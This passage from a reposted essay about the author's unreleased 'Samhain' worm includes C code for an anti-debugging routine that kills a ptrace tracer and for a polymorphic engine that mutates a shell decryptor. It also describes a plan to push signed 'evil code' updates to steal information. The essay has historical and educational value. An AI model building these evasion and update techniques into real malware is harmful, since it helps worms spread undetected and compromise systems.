					<div class="crayon-nums-content" style=""><div class="crayon-num" data-line="crayon-60580f2d76080684942263-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-60580f2d76080684942263-2">2</div><div class="crayon-num" data-line="crayon-60580f2d76080684942263-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-60580f2d76080684942263-4">4</div><div class="crayon-num" data-line="crayon-60580f2d76080684942263-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-60580f2d76080684942263-6">6</div><div class="crayon-num" data-line="crayon-60580f2d76080684942263-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-60580f2d76080684942263-8">8</div><div class="crayon-num" data-line="crayon-60580f2d76080684942263-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-60580f2d76080684942263-10">10</div><div class="crayon-num" data-line="crayon-60580f2d76080684942263-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-60580f2d76080684942263-12">12</div><div class="crayon-num" data-line="crayon-60580f2d76080684942263-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-60580f2d76080684942263-14">14</div><div class="crayon-num" data-line="crayon-60580f2d76080684942263-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-60580f2d76080684942263-16">16</div><div class="crayon-num" data-line="crayon-60580f2d76080684942263-17">17</div><div class="crayon-num crayon-striped-num" data-line="crayon-60580f2d76080684942263-18">18</div><div class="crayon-num" data-line="crayon-60580f2d76080684942263-19">19</div><div class="crayon-num crayon-striped-num" data-line="crayon-60580f2d76080684942263-20">20</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style=" -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60580f2d76080684942263-1"><span class="crayon-t">void</span><span class="crayon-h"> </span><span class="crayon-e">kill_debug</span><span class="crayon-sy">(</span><span class="crayon-t">void</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-60580f2d76080684942263-2"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-t">int</span><span class="crayon-h"> </span><span class="crayon-v">x</span><span class="crayon-sy">,</span><span class="crayon-v">n</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60580f2d76080684942263-3"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-v">n</span><span class="crayon-o">=</span><span class="crayon-e">getppid</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60580f2d76080684942263-4"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-o">!</span><span class="crayon-sy">(</span><span class="crayon-v">x</span><span class="crayon-o">=</span><span class="crayon-e">fork</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-60580f2d76080684942263-5"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">x</span><span class="crayon-o">=</span><span class="crayon-e">getppid</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60580f2d76080684942263-6"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-e">ptrace</span><span class="crayon-sy">(</span><span class="crayon-v">PTRACE_ATTACH</span><span class="crayon-sy">,</span><span class="crayon-v">x</span><span class="crayon-sy">,</span><span class="crayon-cn">0</span><span class="crayon-sy">,</span><span class="crayon-cn">0</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-60580f2d76080684942263-7"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">fprintf</span><span class="crayon-sy">(</span><span class="crayon-v">stderr</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-60580f2d76080684942263-8"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"\n\n\n*****************************************\n"</span></div><div class="crayon-line" id="crayon-60580f2d76080684942263-9"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"*** I REALLY DO NOT LIKE TO BE TRACED ***\n"</span></div><div class="crayon-line crayon-striped-line" id="crayon-60580f2d76080684942263-10"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"*****************************************\n\n\n"</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60580f2d76080684942263-11"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">ptrace</span><span class="crayon-sy">(</span><span class="crayon-v">PTRACE_ATTACH</span><span class="crayon-sy">,</span><span class="crayon-v">n</span><span class="crayon-sy">,</span><span class="crayon-cn">0</span><span class="crayon-sy">,</span><span class="crayon-cn">0</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60580f2d76080684942263-12"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">kill</span><span class="crayon-sy">(</span><span class="crayon-v">x</span><span class="crayon-sy">,</span><span class="crayon-cn">9</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60580f2d76080684942263-13"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-60580f2d76080684942263-14"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">usleep</span><span class="crayon-sy">(</span><span class="crayon-cn">1000</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60580f2d76080684942263-15"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">ptrace</span><span class="crayon-sy">(</span><span class="crayon-v">PTRACE_DETACH</span><span class="crayon-sy">,</span><span class="crayon-v">x</span><span class="crayon-sy">,</span><span class="crayon-cn">0</span><span class="crayon-sy">,</span><span class="crayon-cn">0</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60580f2d76080684942263-16"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">exit</span><span class="crayon-sy">(</span><span class="crayon-cn">0</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60580f2d76080684942263-17"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-60580f2d76080684942263-18"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-e">waitpid</span><span class="crayon-sy">(</span><span class="crayon-v">x</span><span class="crayon-sy">,</span><span class="crayon-o">&amp;</span><span class="crayon-v">n</span><span class="crayon-sy">,</span><span class="crayon-cn">0</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60580f2d76080684942263-19"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-st">return</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60580f2d76080684942263-20"><span class="crayon-sy">}</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0006 seconds] -->
<p></p>
<p>As I told before, worm modules were signed. First, using simple signatures, then using simple private key signing (not really difficult to crack, as key was relatively short, but for sure too difficult for amateurs). This made us sure weâre going to replace our worm image with REAL worm, not dummy anti-worm flare.</p>
<p><strong>0x06: Polymorphism</strong></p>
<p>Polymorphic engine was quite simple â designed to make sure our decryptor will be different every time. As it has been written in shell language, it was pretty easy to add bogus commands, insert empty shell variables, add \ and break contents, or even replace some parts with $SHELL_VARIABLES declared before. Getting original content is not quite easy, but of course, all you have to do is to imitate shell parsing of this decryptor to get original contents, then youâll be able to identify at least some common code.</p>
<p>Code adding \ to decryptor looks like:</p>
<p>  </p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60580f2d76082277567634" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; ">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style=""><span class="crayon-title"></span>
			<div class="crayon-tools" style=""><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style=""></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; ">
while (decryptor[x]) {
    switch (decryptor[x]) {
      case ' ':
        if (!rnd(2)) buf[y++]=' '; else goto difolt;
        break;
      case '\n':
        if (!you_can) you_can=1;
      default:
      difolt:
        if ((you_can &amp;&amp; you_can++&gt;1) &amp;&amp; !rnd(10) &amp;&amp; decryptor[x]&gt;5 &amp;&amp;
             decryptor[x]!='&gt;' &amp;&amp; decryptor[x]!='&lt;' &amp;&amp; norm&gt;2) {
          buf[y++]='\\';buf[y++]=10;norm=0;
        } else {buf[y++]=decryptor[x++];norm++;}
    }
  }</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style=""><div class="crayon-num" data-line="crayon-60580f2d76082277567634-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-60580f2d76082277567634-2">2</div><div class="crayon-num" data-line="crayon-60580f2d76082277567634-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-60580f2d76082277567634-4">4</div><div class="crayon-num" data-line="crayon-60580f2d76082277567634-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-60580f2d76082277567634-6">6</div><div class="crayon-num" data-line="crayon-60580f2d76082277567634-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-60580f2d76082277567634-8">8</div><div class="crayon-num" data-line="crayon-60580f2d76082277567634-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-60580f2d76082277567634-10">10</div><div class="crayon-num" data-line="crayon-60580f2d76082277567634-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-60580f2d76082277567634-12">12</div><div class="crayon-num" data-line="crayon-60580f2d76082277567634-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-60580f2d76082277567634-14">14</div><div class="crayon-num" data-line="crayon-60580f2d76082277567634-15">15</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style=" -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60580f2d76082277567634-1"><span class="crayon-st">while</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-v">decryptor</span><span class="crayon-sy">[</span><span class="crayon-v">x</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-60580f2d76082277567634-2"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">switch</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-v">decryptor</span><span class="crayon-sy">[</span><span class="crayon-v">x</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-60580f2d76082277567634-3"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">case</span><span class="crayon-h"> </span><span class="crayon-s">' '</span><span class="crayon-o">:</span></div><div class="crayon-line crayon-striped-line" id="crayon-60580f2d76082277567634-4"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-o">!</span><span class="crayon-e">rnd</span><span class="crayon-sy">(</span><span class="crayon-cn">2</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-v">buf</span><span class="crayon-sy">[</span><span class="crayon-v">y</span><span class="crayon-o">++</span><span class="crayon-sy">]</span><span class="crayon-o">=</span><span class="crayon-s">' '</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-st">else</span><span class="crayon-h"> </span><span class="crayon-st">goto</span><span class="crayon-h"> </span><span class="crayon-v">difolt</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60580f2d76082277567634-5"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">break</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60580f2d76082277567634-6"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">case</span><span class="crayon-h"> </span><span class="crayon-s">'\n'</span><span class="crayon-o">:</span></div><div class="crayon-line" id="crayon-60580f2d76082277567634-7"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-o">!</span><span class="crayon-v">you_can</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-v">you_can</span><span class="crayon-o">=</span><span class="crayon-cn">1</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60580f2d76082277567634-8"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">default</span><span class="crayon-o">:</span></div><div class="crayon-line" id="crayon-60580f2d76082277567634-9"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">difolt</span><span class="crayon-o">:</span></div><div class="crayon-line crayon-striped-line" id="crayon-60580f2d76082277567634-10"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">(</span><span class="crayon-v">you_can</span><span class="crayon-h"> </span><span class="crayon-o">&amp;&amp;</span><span class="crayon-h"> </span><span class="crayon-v">you_can</span><span class="crayon-o">++</span><span class="crayon-o">&gt;</span><span class="crayon-cn">1</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">&amp;&amp;</span><span class="crayon-h"> </span><span class="crayon-o">!</span><span class="crayon-e">rnd</span><span class="crayon-sy">(</span><span class="crayon-cn">10</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">&amp;&amp;</span><span class="crayon-h"> </span><span class="crayon-v">decryptor</span><span class="crayon-sy">[</span><span class="crayon-v">x</span><span class="crayon-sy">]</span><span class="crayon-o">&gt;</span><span class="crayon-cn">5</span><span class="crayon-h"> </span><span class="crayon-o">&amp;&amp;</span></div><div class="crayon-line" id="crayon-60580f2d76082277567634-11"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-v">decryptor</span><span class="crayon-sy">[</span><span class="crayon-v">x</span><span class="crayon-sy">]</span><span class="crayon-o">!=</span><span class="crayon-s">'&gt;'</span><span class="crayon-h"> </span><span class="crayon-o">&amp;&amp;</span><span class="crayon-h"> </span><span class="crayon-v">decryptor</span><span class="crayon-sy">[</span><span class="crayon-v">x</span><span class="crayon-sy">]</span><span class="crayon-o">!=</span><span class="crayon-s">'&lt;'</span><span class="crayon-h"> </span><span class="crayon-o">&amp;&amp;</span><span class="crayon-h"> </span><span class="crayon-v">norm</span><span class="crayon-o">&gt;</span><span class="crayon-cn">2</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-60580f2d76082277567634-12"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">buf</span><span class="crayon-sy">[</span><span class="crayon-v">y</span><span class="crayon-o">++</span><span class="crayon-sy">]</span><span class="crayon-o">=</span><span class="crayon-s">'\\'</span><span class="crayon-sy">;</span><span class="crayon-v">buf</span><span class="crayon-sy">[</span><span class="crayon-v">y</span><span class="crayon-o">++</span><span class="crayon-sy">]</span><span class="crayon-o">=</span><span class="crayon-cn">10</span><span class="crayon-sy">;</span><span class="crayon-v">norm</span><span class="crayon-o">=</span><span class="crayon-cn">0</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60580f2d76082277567634-13"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span><span class="crayon-h"> </span><span class="crayon-st">else</span><span class="crayon-h"> </span><span class="crayon-sy">{</span><span class="crayon-v">buf</span><span class="crayon-sy">[</span><span class="crayon-v">y</span><span class="crayon-o">++</span><span class="crayon-sy">]</span><span class="crayon-o">=</span><span class="crayon-v">decryptor</span><span class="crayon-sy">[</span><span class="crayon-v">x</span><span class="crayon-o">++</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span><span class="crayon-v">norm</span><span class="crayon-o">++</span><span class="crayon-sy">;</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-60580f2d76082277567634-14"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-60580f2d76082277567634-15"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0008 seconds] -->
<p></p>
<p><strong>0x07: Usability</strong></p>
<p>Itâs stupid to launch worm designed eg. to steal secret information from specific host, because we have no idea if it will work fine, and wonât be caught. If so, it might be debugged (itâs made to be hard to debug, but, as every program, itâs not impossible to do it, especially if youâre able to separate worm code). Instead, we should be able to release âharmlessâ worm, then, when weâre sure it accessed interesting host and havenât been caught, we might send an update, which will try to reach destination worm, replace it with our evil code, then shut down every worm it can access via wormnet (by sending signed update, that will send itself to other worms, then shut down).</p>
<p>Maybe it isnât the perfect solution, but in fact itâs probably much safer than inserting even generic backdoor code by default.</p>
<p><strong>0x08: What happened then?</strong></p>
<p>Thatâs it, the Samhain project, fit into approx. 40 kB of code. What happened to it? Nothing. It hasnât been ever released, and I never removed restrictions from lookup_victim() and infect_host() routines. Itâs still lying on my hard drive, getting covered with dust and oblivion, and thatâs extacly what we wanted.</p>
<p>I stopped developing new code and testing it in January, 1999, with Samhain 2.2 and approx. 10000 lines of code. Wojtek Bojdol has been developing his much more advanced wormnet and system infection/monitoring code till February or March, but I havenât found enough time to incorporate his sources within mainstream source tree. Then, we removed our repository from networked server we used to exchange ideas. I gradually published some bugs used in exploit database to BUGTRAQ, some of them (especially those not discovered by me) we kept for ourselves.</p>
<p>The story ends. Till another rainy day, till another three bored hackers.</p>
<p>You may be sure it will happen. The only thing you canât be sure is the end of next story.</p>
<p><strong>0x09: References</strong></p>
<p>[1] ILOVEYOU worm:<br />
    Dramatical headlines:<br />
    + <a href="http://www.cnn.com/2000/TECH/computing/05/04/iloveyou.03/   ">http://www.cnn.com/2000/TECH/computing/05/04/iloveyou.03/   </a><br />
    Technical analysis:<br />
    + <a href="http://www.securityfocus.com/templates/article.html?id=30">http://www.securityfocus.com/templates/article.html?id=30</a><br />
    Source of âILOVEYOUâ worm:<br />
    + <a href="http://packetstorm.securify.com/viral-db/love-letter-source.txt">http://packetstorm.securify.com/viral-db/love-letter-source.txt</a></p>
<p>[2] International Obfuscated C Code Contest archives:<br />
    + <a href="http://www.ioccc.org">http://www.ioccc.org</a></p>
<p>[3] Libworm â unprivledged process hiding techniques:<br />
    + <a href="http://lcamtuf.na.export.pl/pliki/libworm.tgz">http://lcamtuf.na.export.pl/pliki/libworm.tgz</a></p>
<p>[4] âyet another article about stealth modules in linuxâ<br />
    + <a href="http://www.securityfocus.com/templates/archive.pike?list=1&date=1999-08-22&msg=19990828144031.A20936@richi.bombi.net">http://www.securityfocus.com</a></p>
<p>[5] Advanced File Hide and Redirect Module (in fact, old and lame ;)<br />
    + <a href="http://lcamtuf.na.export.pl/pliki/afharm.zip">http://lcamtuf.na.export.pl/pliki/afharm.zip</a><br />
    Adore<br />
    + ???</p>
<p></p>
<p><em>Again this is an old article but itâs a good one, written by Michal Zalewski <lcamtuf@tpi.pl> and edited by Darknet</em></p>
<div class="swp_social_panel swp_horizontal_panel swp_modern  swp_default_full_color swp_other_full_color swp_individual_color_outlines scale-90 scale-full_width" data-min-width="1100" data-float-color="#ffffff" data-float="bottom" data-float-mobile="bottom" data-transition="slide" data-post-id="406" ><div class="nc_tweetContainer swp_share_button swp_facebook" data-network="facebook"><a class="nc_tweet swp_share_link" rel="nofollow noreferrer noopener" target="_blank" href="https://www.facebook.com/share.php?u=https%3A%2F%2Fwww.darknet.org.uk%2F2006%2F12%2Fwriting-worms-for-fun-or-profit%2F" data-link="https://www.facebook.com/share.php?u=https%3A%2F%2Fwww.darknet.org.uk%2F2006%2F12%2Fwriting-worms-for-fun-or-profit%2F"><span class="iconFiller"><span class="spaceManWilly"><i class="sw swp_facebook_icon"></i><span class="swp_share">Share</span></span></span><span class="swp_count">15</span></a></div><div class="nc_tweetContainer swp_share_button swp_twitter" data-network="twitter"><a class="nc_tweet swp_share_link" rel="nofollow noreferrer noopener" target="_blank" href="https://twitter.com/intent/tweet?text=Writing+Worms+for+Fun+or+Profit&url=https%3A%2F%2Fwww.darknet.org.uk%2F2006%2F12%2Fwriting-worms-for-fun-or-profit%2F&via=THEdarknet" data-link="https://twitter.com/intent/tweet?text=Writing+Worms+for+Fun+or+Profit&url=https%3A%2F%2Fwww.darknet.org.uk%2F2006%2F12%2Fwriting-worms-for-fun-or-profit%2F&via=THEdarknet"><span class="iconFiller"><span class="spaceManWilly"><i class="sw swp_twitter_icon"></i><span class="swp_share">Tweet</span></span></span><span class="swp_count">1</span></a></div><div class="nc_tweetContainer swp_share_button swp_linkedin" data-network="linkedin"><a class="nc_tweet swp_share_link" rel="nofollow noreferrer noopener" target="_blank" href="https://www.linkedin.com/cws/share?url=https%3A%2F%2Fwww.darknet.org.uk%2F2006%2F12%2Fwriting-worms-for-fun-or-profit%2F" data-link="https://www.linkedin.com/cws/share?url=https%3A%2F%2Fwww.darknet.org.uk%2F2006%2F12%2Fwriting-worms-for-fun-or-profit%2F"><span class="swp_count swp_hide"><span class="iconFiller"><span class="spaceManWilly"><i class="sw swp_linkedin_icon"></i><span class="swp_share">Share</span></span></span></span></a></div><div class="nc_tweetContainer swp_share_button swp_buffer" data-network="buffer"><a class="nc_tweet swp_share_link" rel="nofollow noreferrer noopener" target="_blank" href="https://bufferapp.com/add?url=https%3A%2F%2Fwww.darknet.org.uk%2F2006%2F12%2Fwriting-worms-for-fun-or-profit%2F&text=Writing+Worms+for+Fun+or+Profit" data-link="https://bufferapp.com/add?url=https%3A%2F%2Fwww.darknet.org.uk%2F2006%2F12%2Fwriting-worms-for-fun-or-profit%2F&text=Writing+Worms+for+Fun+or+Profit"><span class="swp_count swp_hide"><span class="iconFiller"><span class="spaceManWilly"><i class="sw swp_buffer_icon"></i><span class="swp_share">Buffer</span></span></span></span></a></div><div class="nc_tweetContainer swp_share_button swp_whatsapp" data-network="whatsapp"><a class="nc_tweet swp_share_link" rel="nofollow noreferrer noopener" target="_blank" href="https://api.whatsapp.com/send?text=https%3A%2F%2Fwww.darknet.org.uk%2F2006%2F12%2Fwriting-worms-for-fun-or-profit%2F" data-link="https://api.whatsapp.com/send?text=https%3A%2F%2Fwww.darknet.org.uk%2F2006%2F12%2Fwriting-worms-for-fun-or-profit%2F"><span class="swp_count swp_hide"><span class="iconFiller"><span class="spaceManWilly"><i class="sw swp_whatsapp_icon"></i><span class="swp_share">WhatsApp</span></span></span></span></a></div><div class="nc_tweetContainer swp_share_button swp_email" data-network="email"><a class="nc_tweet noPop swp_share_link" rel="nofollow noreferrer noopener" href="mailto:?subject=Writing%20Worms%20for%20Fun%20or%20Profit&body=0x00%3A%20Preface%20Media%2C%20kindly%20supported%20by%20AV%20%22experts%22%2C%20drawn%20apocalyptical%20vison%20of%20desctruction%20caused%20by%20stupid%20M%24%20Outlook%20%2F%20VisualBasic%20worm%2C%20called%20%22ILOVEYOU%22.%20Absurdal%20estimations%20-%20%2410M%20lost%20for%20%22defending%20the%20disease%22%2C%20especially%20when%20you%20take%20a%20look%20at%20increasing%20with%20the%20speed%20of%20light%20value%20of%20AV%20companies%20market%20shares%2C%20made%20many%20people%20sick.%20Lame%20VBS%20application%20that%20isn%27t%20even%20able%20to%20spread%20without%20luser%20click-me%20interaction%2C%20and%20is%20limited%20to%20one%2C%20desk-end%20operating%20system...%20Worm%20that%20sends%20itself%20to%20people%20in%20your%20addressbook%2C%20and%2C%20in%20it%27s%20original%20version%2C%20kills%20mp3%20files%20on%20your%20disk%20.%20And%20you%20call%0D%0A%0D%0ARead More Here: %20https%3A%2F%2Fwww.darknet.org.uk%2F2006%2F12%2Fwriting-worms-for-fun-or-profit%2F" target="_blank"><span class="swp_count swp_hide"><span class="iconFiller"><span class="spaceManWilly"><i class="sw swp_email_icon"></i><span class="swp_share">Email</span></span></span></span></a></div><div class="nc_tweetContainer swp_share_button total_shares total_sharesalt" ><span class="swp_count ">16 <span class="swp_label">Shares</span></span></div></div><div class="swp-content-locator"></div>	</section><!-- /.entry -->
	<div class="fix"></div>

<strong>Posted in:</strong> <a href="https://www.darknet.org.uk/category/hacker-culture/" rel="category tag">Hacker Culture</a>, <a href="https://www.darknet.org.uk/category/virustrojanswormsrootkits/" rel="category tag">Malware</a>, <a href="https://www.darknet.org.uk/category/secure-coding/" rel="category tag">Secure Coding</a><br /><br />

<div class="post-utility"><p class="tags"><i class="fa fa-tag"></i> <a href="https://www.darknet.org.uk/tag/computer-security/" rel="tag">computer-security</a>, <a href="https://www.darknet.org.uk/tag/darknet/" rel="tag">darknet</a>, <a href="https://www.darknet.org.uk/tag/malware/" rel="tag">malware</a>, <a href="https://www.darknet.org.uk/tag/programming/" rel="tag">Programming</a>, <a href="https://www.darknet.org.uk/tag/virii/" rel="tag">virii</a>, <a href="https://www.darknet.org.uk/tag/virus/" rel="tag">virus</a>, <a href="https://www.darknet.org.uk/tag/viruses/" rel="tag">viruses</a>, <a href="https://www.darknet.org.uk/tag/worms/" rel="tag">worms</a></p> </div>
</article><!-- /.post -->

<p align="center">
<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<!-- Darknet Responsive Archive Ad Links -->
<ins class="adsbygoogle"
     style="display:block"
     data-ad-client="ca-pub-3033787195489589"
     data-ad-slot="4364698497"
     data-ad-format="link"></ins>
<script>
(adsbygoogle = window.adsbygoogle || []).push({});
</script>
</p><br />

<h3>Latest Posts:</h2><br />


        
                <a title="APT-Hunter &#8211; Threat Hunting Tool via Windows Event Log" href="https://www.darknet.org.uk/2021/03/apt-hunter-threat-hunting-tool-via-windows-event-log/"><img src="https://cdn.darknet.org.uk/wp-content/uploads/2021/03/APT-Hunter-Threat-Hunting-Tool-via-Windows-Event-Log-150x75.png" alt="APT-Hunter - Threat Hunting Tool via Windows Event Log"  width="150"  height="75" title="APT-Hunter &#8211; Threat Hunting Tool via Windows Event Log" class="woo-image alignleft" /></a>
                <a title="APT-Hunter &#8211; Threat Hunting Tool via Windows Event Log" href="https://www.darknet.org.uk/2021/03/apt-hunter-threat-hunting-tool-via-windows-event-log/">APT-Hunter &#8211; Threat Hunting Tool via Windows Event Log</a><br />
		APT-Hunter is a threat hunting tool for windows event logs made from the perspective of the purple team mindset to provide detection for APT movements hidden in the sea of windows event logs.                <div class="post-meta"><strong>March 5, 2021 - 132 Shares</strong></div>
                <div class="fix"></div>

        
        
